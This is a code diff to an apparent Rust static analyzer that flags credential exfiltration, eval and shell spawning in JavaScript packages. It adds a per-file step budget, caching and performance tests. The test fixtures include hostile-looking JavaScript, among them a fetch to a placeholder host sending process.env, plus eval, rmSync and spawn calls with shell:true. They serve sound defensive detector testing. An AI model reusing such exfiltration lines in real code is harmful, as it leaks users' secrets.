@@ -1,3 +1,4 @@
+mod ancestry;
 #[cfg(test)]
 mod archive_tests;
 mod bundles;
@@ -8,13 +9,23 @@ mod reports;
 use oxc_ast::{AstKind, ast::*};
 use oxc_semantic::{Semantic, SymbolId};
 use oxc_str::JSStr;
+use std::cell::RefCell;
 use std::collections::{HashMap, HashSet};
+use std::rc::Rc;
 
 const SECRET: u8 = 1;
 const ENVIRONMENT: u8 = 2;
 const CREDENTIAL_FILE: u8 = 4;
 const MAX_DEPTH: usize = 32;
 const MAX_STEPS: usize = 4096;
+
+/// Steps every candidate of a file may spend together, per byte of source
+/// and for any source. Each candidate starts with [`MAX_STEPS`] of its own,
+/// so a file of thousands of candidates that each spend them all would
+/// take the product. A file that runs out is read with pattern checks
+/// only.
+const FILE_STEPS_PER_BYTE: usize = 1;
+const FILE_STEPS_FLOOR: usize = 16 * MAX_STEPS;
 
 #[derive(Clone, Copy)]
 pub(super) struct Leak {
@@ -111,17 +122,90 @@ struct Flow<'s, 'a> {
     parameters: HashMap<SymbolId, (u32, usize)>,
     callers: HashMap<u32, Vec<&'a CallExpression<'a>>>,
     methods: HashMap<(u32, bool), HashMap<NameKey, Option<u32>>>,
-    terminators: HashMap<u32, u32>,
+    ancestry: ancestry::Ancestry,
     defaults: HashMap<SymbolId, &'a Expression<'a>>,
     iterations: HashMap<SymbolId, &'a Expression<'a>>,
     report_writes: HashMap<SymbolId, Vec<reports::Write<'a>>>,
     returns: HashMap<u32, Vec<&'a Expression<'a>>>,
     steps: usize,
+    /// Steps the current candidate was given.
+    granted: usize,
+    /// Steps left for the rest of the file's candidates.
+    file_steps: usize,
+    /// A candidate got fewer than [`MAX_STEPS`] because the file's steps
+    /// ran out.
+    over_budget: bool,
     written: HashSet<SymbolId>,
     bundles: bundles::Bundles,
+    /// The method each binding destructured from an object names, as
+    /// [`Flow::api`] reads it.
+    destructured: HashMap<SymbolId, &'a str>,
+    objects: RefCell<HashMap<usize, Rc<ObjectFields>>>,
+}
+
+/// The properties [`Flow::field`] and [`Flow::value`] read of an object
+/// literal, by position: its last [`MAX_STEPS`] properties, from the last
+/// one back to the first spread or computed key, each name once, the last
+/// write first. Reading them from the literal for every step made a
+/// candidate's steps cost up to [`MAX_STEPS`] each.
+struct ObjectFields {
+    positions: Vec<usize>,
+    by_name: HashMap<NameKey, usize>,
+}
+
+impl ObjectFields {
+    fn new(object: &ObjectExpression<'_>) -> Self {
+        let mut positions = Vec::new();
+        let mut by_name = HashMap::new();
+        let count = object.properties.len();
+        for (offset, property) in object.properties.iter().rev().take(MAX_STEPS).enumerate() {
+            let ObjectPropertyKind::ObjectProperty(property) = property else {
+                break;
+            };
+            let Some(key) = property.key.static_name() else {
+                break;
+            };
+            let position = count - 1 - offset;
+            let key: NameKey = key.as_js_str().as_bytes().into();
+            if let std::collections::hash_map::Entry::Vacant(entry) = by_name.entry(key) {
+                entry.insert(position);
+                positions.push(position);
+            }
+        }
+        Self { positions, by_name }
+    }
+}
+
+/// The value of the property at `position`, which [`ObjectFields`] found
+/// to be a property with a static name.
+fn property_value<'e, 'a>(object: &'e ObjectExpression<'a>, position: usize) -> &'e Expression<'a> {
+    match &object.properties[position] {
+        ObjectPropertyKind::ObjectProperty(property) => &property.value,
+        ObjectPropertyKind::SpreadProperty(spread) => &spread.argument,
+    }
 }
 
 impl<'s, 'a> Flow<'s, 'a> {
+    /// Starts reading one candidate, with [`MAX_STEPS`] or what is left of
+    /// the file's steps.
+    fn begin_candidate(&mut self) {
+        let spent = self.granted - self.steps;
+        self.file_steps = self.file_steps.saturating_sub(spent);
+        self.granted = MAX_STEPS.min(self.file_steps);
+        self.over_budget |= self.granted < MAX_STEPS;
+        self.steps = self.granted;
+    }
+
+    fn object_fields(&self, object: &ObjectExpression<'_>) -> Rc<ObjectFields> {
+        let address = std::ptr::from_ref(object).addr();
+        Rc::clone(
+            self.objects
+                .borrow_mut()
+                .entry(address)
+                .or_insert_with(|| Rc::new(ObjectFields::new(object))),
+        )
+    }
+
     fn symbol(&self, identifier: &IdentifierReference<'_>) -> Option<SymbolId> {
         self.semantic
             .scoping()
@@ -291,23 +375,13 @@ impl<'s, 'a> Flow<'s, 'a> {
                 0
             }
             Expression::ObjectExpression(object) => {
-                let mut seen = HashSet::new();
+                let fields = self.object_fields(object);
                 let mut result = 0;
-                for property in object.properties.iter().rev().take(MAX_STEPS) {
+                for &position in &fields.positions {
                     if self.steps == 0 {
                         break;
                     }
-                    match property {
-                        ObjectPropertyKind::ObjectProperty(property) => {
-                            let Some(key) = property.key.static_name() else {
-                                return result;
-                            };
-                            if seen.insert(key) {
-                                result |= self.value(&property.value, next);
-                            }
-                        }
-                        ObjectPropertyKind::SpreadProperty(_) => return result,
-                    }
+                    result |= self.value(property_value(object, position), next);
                 }
                 result
             }
@@ -435,18 +509,8 @@ impl<'s, 'a> Flow<'s, 'a> {
                 self.field(call.arguments.first()?.as_expression()?, field, depth + 1)
             }
             Expression::ObjectExpression(object) => {
-                for property in object.properties.iter().rev().take(MAX_STEPS) {
-                    match property {
-                        ObjectPropertyKind::ObjectProperty(property) => {
-                            let key = property.key.static_name()?;
-                            if key.as_js_str() == field {
-                                return Some(&property.value);
-                            }
-                        }
-                        ObjectPropertyKind::SpreadProperty(_) => return None,
-                    }
-                }
-                None
+                let position = *self.object_fields(object).by_name.get(field.as_bytes())?;
+                Some(property_value(object, position))
             }
             _ => None,
         }
@@ -516,7 +580,46 @@ fn is_source_candidate(kind: AstKind<'_>) -> bool {
     }
 }
 
+/// The method name [`Flow::api`] reads for each binding a declarator
+/// destructures from an object: the first property of the declarator's
+/// own pattern that binds it and has a plain name. Finding it in the
+/// pattern for every call cost the pattern's size each time.
+fn destructured_methods<'a>(semantic: &Semantic<'a>) -> HashMap<SymbolId, &'a str> {
+    let mut methods = HashMap::new();
+    for node in semantic.nodes().iter() {
+        let AstKind::VariableDeclarator(variable) = node.kind() else {
+            continue;
+        };
+        let BindingPattern::ObjectPattern(pattern) = &variable.id else {
+            continue;
+        };
+        for property in &pattern.properties {
+            let BindingPattern::BindingIdentifier(binding) = &property.value else {
+                continue;
+            };
+            let Some(symbol) = binding.symbol_id.get() else {
+                continue;
+            };
+            let name = match &property.key {
+                PropertyKey::StaticIdentifier(key) => Some(key.name.as_str()),
+                PropertyKey::StringLiteral(key) => key.value.as_str(),
+                _ => None,
+            };
+            if let Some(name) = name
+                && semantic.scoping().symbol_declaration(symbol) == node.id()
+            {
+                methods.entry(symbol).or_insert(name);
+            }
+        }
+    }
+    methods
+}
+
 fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
+    let ancestry = ancestry::Ancestry::new(semantic);
+    let bundles = bundles::Bundles::collect(semantic, &ancestry);
+    let source_len =
+        oxc_span::GetSpan::span(&semantic.nodes().kind(oxc_semantic::NodeId::ROOT)).end as usize;
     let mut flow = Flow {
         semantic,
         parameters: HashMap::new(),
@@ -524,10 +627,17 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
         methods: HashMap::new(),
         returns: HashMap::new(),
         report_writes: HashMap::new(),
-        terminators: operations::terminators(semantic),
+        ancestry,
         defaults: HashMap::new(),
         iterations: HashMap::new(),
         steps: MAX_STEPS,
+        granted: MAX_STEPS,
+        file_steps: source_len
+            .saturating_mul(FILE_STEPS_PER_BYTE)
+            .max(FILE_STEPS_FLOOR),
+        over_budget: false,
+        destructured: destructured_methods(semantic),
+        objects: RefCell::new(HashMap::new()),
         written: semantic
             .scoping()
             .symbol_ids()
@@ -538,7 +648,7 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
                     .any(|reference| reference.is_write())
             })
             .collect(),
-        bundles: bundles::Bundles::collect(semantic),
+        bundles,
     };
     for node in semantic.nodes().iter() {
         if let AstKind::Class(class) = node.kind() {
@@ -642,17 +752,9 @@ fn build_flow<'s, 'a>(semantic: &'s Semantic<'a>) -> Flow<'s, 'a> {
     }
     for node in semantic.nodes().iter() {
         if let AstKind::ReturnStatement(statement) = node.kind()
-            && operations::reachable(semantic, &flow.terminators, node.id())
+            && flow.ancestry.reachable(node.id())
             && let Some(value) = &statement.argument
-            && let Some(owner) =
-                semantic
-                    .nodes()
-                    .ancestor_kinds(node.id())
-                    .find_map(|kind| match kind {
-                        AstKind::Function(function) => Some(function.span.start),
-                        AstKind::ArrowFunctionExpression(function) => Some(function.span.start),
-                        _ => None,
-                    })
+            && let Some(owner) = flow.ancestry.function_or_arrow_start(semantic, node.id())
         {
             flow.returns.entry(owner).or_default().push(value);
         }
@@ -677,9 +779,15 @@ pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::Call
     if has_operations {
         operations::analyze(&mut flow, facts);
     }
-    if !has_sources {
-        return;
+    if has_sources {
+        exfiltration(&mut flow, facts);
     }
+    flow.begin_candidate();
+    facts.over_budget |= flow.over_budget;
+}
+
+fn exfiltration(flow: &mut Flow<'_, '_>, facts: &mut super::bindings::CallFacts) {
+    let semantic = flow.semantic;
     let candidates = semantic
         .nodes()
         .iter()
@@ -688,13 +796,13 @@ pub(super) fn analyze(semantic: &Semantic<'_>, facts: &mut super::bindings::Call
             _ => None,
         });
     for (id, call) in candidates {
-        if !operations::reachable(semantic, &flow.terminators, id) {
+        if !flow.ancestry.reachable(id) {
             continue;
         }
         let Some(payload) = flow.sink(call) else {
             continue;
         };
-        flow.steps = MAX_STEPS;
+        flow.begin_candidate();
         let value = if name(&call.callee) == Some("fetch") {
             let headers = flow.field(payload, "headers".into(), 0);
             let body = flow.field(payload, "body".into(), 0);
@@ -874,5 +982,165 @@ mod tests {
         ] {
             assert!(!leaks(source), "{source}");
         }
+    }
+
+    fn nested(open: &str, middle: &str, close: &str, depth: usize) -> String {
+        let mut source = open.repeat(depth);
+        source.push_str(middle);
+        source.push_str(&close.repeat(depth));
+        source
+    }
+
+    fn time_to_analyze(sources: &[String]) -> std::time::Duration {
+        let started = std::time::Instant::now();
+        for source in sources {
+            let result = super::super::analyze_bytes("index.js", source.as_bytes());
+            assert_eq!(result.unparsed_files, 0, "{}", &source[..80]);
+        }
+        started.elapsed()
+    }
+
+    #[test]
+    fn calls_nested_thousands_of_levels_deep_are_analyzed_in_one_pass() {
+        // Each rule once walked up from every call it checked, so a file
+        // that nests every call a level deeper took the square of its
+        // depth: twenty times as long as the same calls side by side.
+        let depth = 8_000;
+        let nested_calls = [
+            nested("eval(", "a", ")", depth),
+            nested("a?eval(a):", "0", "", depth),
+            format!("if(a)eval(a);{}", "else if(a)eval(a);".repeat(depth)),
+            format!(
+                "import {{rmSync}} from 'fs';{}",
+                nested("rmSync(", "a", ")", depth)
+            ),
+            format!(
+                "var m={{}};function r(i){{return {}}}eval(a);",
+                nested("m[i].call(", "0", ")", depth)
+            ),
+            format!(
+                "const fs=require('fs');{}",
+                nested("fs.writeFileSync('a',", "'b'", ")", depth)
+            ),
+            format!(
+                "class C{{}};f({{{}}});eval(a);",
+                nested("1:{a:()=>C,b:{", "", "}}", depth)
+            ),
+        ];
+        let side_by_side: Vec<String> = nested_calls
+            .iter()
+            .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
+            .collect();
+        let nested_time = time_to_analyze(&nested_calls);
+        let flat_time = time_to_analyze(&side_by_side);
+        assert!(
+            nested_time < flat_time * 5,
+            "nested {nested_time:?}, side by side {flat_time:?}"
+        );
+    }
+
+    #[test]
+    fn objects_that_spread_each_other_are_read_once_each() {
+        // Each spread was followed again for every object that spread it,
+        // with no memory of objects already read. When no spread names a
+        // shell, every one is followed to the depth limit: 300 spreads of
+        // one object into itself took hours.
+        let spreads = "...o,".repeat(300);
+        let source = format!("const o={{{spreads}}};require('child_process').spawn('x',[],o);");
+        let started = std::time::Instant::now();
+        let result = super::super::analyze_bytes("index.js", source.as_bytes());
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(5),
+            "{:?}",
+            started.elapsed()
+        );
+        assert_eq!(result.unparsed_files, 0);
+        assert!(!result.source.shell);
+
+        let spread_shell = format!(
+            "const base={{shell:true}};const o={{...base,{spreads}}};require('child_process').spawn('x',[],o);"
+        );
+        assert!(
+            super::super::analyze_bytes("index.js", spread_shell.as_bytes())
+                .source
+                .shell
+        );
+    }
+
+    #[test]
+    fn a_call_repeated_thousands_of_times_reads_its_declaration_once() {
+        // Each call read the whole object, class or pattern its callee or
+        // receiver was declared from, so repeating a call was quadratic.
+        let props = 6_000;
+        let calls = 6_000;
+        let repeated = [
+            format!(
+                "const o={{{}}};{}",
+                "a:0,".repeat(props),
+                "require('child_process').spawn(0,o);".repeat(calls / 8)
+            ),
+            format!(
+                "const r={{{}}};{}",
+                "a:0,".repeat(props),
+                "r.eval();".repeat(calls)
+            ),
+            format!(
+                "class C{{{}}}{}",
+                "a(){}".repeat(props),
+                "new C().eval();".repeat(calls)
+            ),
+            format!(
+                "const {{{}z}}=globalThis;{}",
+                (0..props).map(|i| format!("a{i},")).collect::<String>(),
+                "z();".repeat(calls)
+            ),
+            format!(
+                "const {{{}z}}=require('fs');x.rm;{}",
+                (0..props).map(|i| format!("a{i},")).collect::<String>(),
+                "z();".repeat(calls)
+            ),
+        ];
+        let side_by_side: Vec<String> = repeated
+            .iter()
+            .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
+            .collect();
+        let repeated_time = time_to_analyze(&repeated);
+        let flat_time = time_to_analyze(&side_by_side);
+        assert!(
+            repeated_time < flat_time * 5,
+            "repeated {repeated_time:?}, side by side {flat_time:?}"
+        );
+    }
+
+    #[test]
+    fn a_file_whose_candidates_spend_more_steps_than_its_size_allows_is_incomplete() {
+        // Each candidate gets its own steps; thousands of uploads of an
+        // array that costs all of them each took seconds.
+        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
+        let reads = "o.x,".repeat(4_095);
+        let uploads = "fetch('https://e.example',{body:a});".repeat(500);
+        let source = format!("require('fs');const o={{{fields}}};const a=[{reads}];{uploads}");
+        let started = std::time::Instant::now();
+        let result = super::super::analyze_bytes("index.js", source.as_bytes());
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(5),
+            "{:?}",
+            started.elapsed()
+        );
+        assert_eq!(result.unparsed_files, 1);
+    }
+
+    #[test]
+    fn a_leak_found_before_the_steps_run_out_is_still_reported() {
+        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
+        let reads = "o.x,".repeat(4_095);
+        let uploads = "fetch('https://e.example',{body:a});".repeat(500);
+        let source = format!(
+            "require('fs');const o={{{fields}}};const a=[{reads}];fetch('https://e.example',{{body:process.env}});{uploads}"
+        );
+        let result = super::super::analyze_bytes("index.js", source.as_bytes());
+        assert!(
+            serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"] == true
+        );
     }
 }
